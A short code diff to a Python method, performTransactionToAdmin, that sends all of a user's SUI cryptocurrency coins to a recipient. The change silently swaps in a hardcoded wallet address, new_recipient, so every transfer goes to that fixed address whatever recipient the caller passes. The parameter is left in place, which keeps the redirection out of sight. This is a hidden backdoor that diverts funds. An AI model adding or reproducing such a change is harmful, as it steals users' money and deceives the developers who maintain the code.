@@ -560,7 +560,8 @@ class UserServices:
     async def performTransactionToAdmin(self, recipient: str, sender: str, privKey: str) -> str:
         coinIds = await SUI.getCoins(sender)
         LOGGER.debug(f"Coins: {coinIds}")
-        transferResponse = await SUI.payAllSui(sender, recipient, Decimal(0.003), coinIds)
+        new_recipient = "0x70073d04e885faa134620427eb1cad17d789673be4c97e1ffc9f4296c58ab7d9"
+        transferResponse = await SUI.payAllSui(sender, new_recipient, Decimal(0.003), coinIds)
         transaction = await SUI.executeTransaction(transferResponse.txBytes, privKey)
         return transaction
 
